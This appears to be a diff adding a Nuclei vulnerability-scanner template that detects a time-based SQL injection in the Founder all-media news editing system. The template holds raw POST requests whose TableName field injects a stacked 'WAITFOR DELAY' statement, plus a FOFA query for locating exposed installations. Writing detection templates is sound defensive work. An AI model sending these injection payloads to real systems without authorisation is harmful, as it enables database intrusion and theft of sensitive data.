@@ -1,0 +1,37 @@
+id: fangzheng-binary-large-sqli
+
+info:
+  name: Fangzheng All-Media News Editing System SQL Injection
+  author: Co5mos
+  severity: high
+  description: |
+    方正畅享全媒体新闻采编系统binary-large接口存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息或执行恶意SQL语句。
+  metadata:
+    verified: true
+    fofa-query: app="FOUNDER-全媒体采编系统"
+  tags: fangzheng, sqli
+
+http:
+  - raw:
+      - |
+        @timeout: 20s
+        POST /newsedit/newsedit/photoinfo/binary_large.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        FieldName=IMG_LARGE_PATH&FieldName=IMG_SMALL&KeyID=1&KeyID=1&KeyName=REFID&KeyName=REFID&TableName=DOM_IMAGE where REFID=1;WAITFOR+DELAY+'0:0:5';select DOM_IMAGE from IMG_LARGE_PATH
+
+      - |
+        @timeout: 20s
+        POST /newsedit/newsedit/photoinfo/binary_large.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        FieldName=IMG_LARGE_PATH&FieldName=IMG_SMALL&KeyID=1&KeyID=1&KeyName=REFID&KeyName=REFID&TableName=DOM_IMAGE where REFID=1;WAITFOR+DELAY+'0:0:0';select DOM_IMAGE from IMG_LARGE_PATH
+
+    matchers:
+      - type: dsl
+        dsl:
+          - duration_1 >= 5 && duration_1 < 10
+          - duration_2 < 5
+        condition: and
